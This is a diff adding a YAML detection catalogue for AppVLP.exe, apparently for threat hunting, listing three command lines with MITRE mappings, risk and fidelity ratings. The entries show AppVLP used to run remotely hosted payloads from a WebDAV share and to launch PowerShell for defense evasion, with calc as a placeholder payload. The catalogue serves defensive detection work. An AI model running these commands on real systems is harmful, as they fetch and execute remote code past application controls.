@@ -1,0 +1,71 @@
+- command: AppVLP.exe \\webdav\calc.bat
+  description: Execute a remotely hosted payload - in this case, calc.bat.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/
+    - https://github.com/MoooKitty/Code-Execution
+    - https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
+  risk: High
+  risk_reason: Manual usage of AppVLP with remote payloads is highly suspicious.
+  fidelity: High
+  fidelity_reason: This is typically a rare commandline in most organizations.
+  tool: AppVLP
+  threatactors:
+    N/A:
+      - N/A
+- command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
+  description: Execute the given PowerShell command as a subprocess of AppVLP.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Execution:
+      - T1059.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/
+    - https://github.com/MoooKitty/Code-Execution
+    - https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
+  risk: High
+  risk_reason: Manual usage of AppVLP with PowerShell in this manner is highly suspicious.
+  fidelity: High
+  fidelity_reason: This is typically a rare or non-existent commandline in most organizations.
+  tool: AppVLP
+  threatactors:
+    N/A:
+      - N/A
+- command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
+  description: Execute the remotely hosted payload via PowerShell.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Execution:
+      - T1059.001
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Appvlp/
+    - https://github.com/MoooKitty/Code-Execution
+    - https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/
+  risk: High
+  risk_reason: Manual usage of AppVLP with PowerShell in this manner is highly suspicious.
+  fidelity: High
+  fidelity_reason: This is typically a rare or non-existent commandline in most organizations.
+  tool: AppVLP
+  threatactors:
+    N/A:
+      - N/A
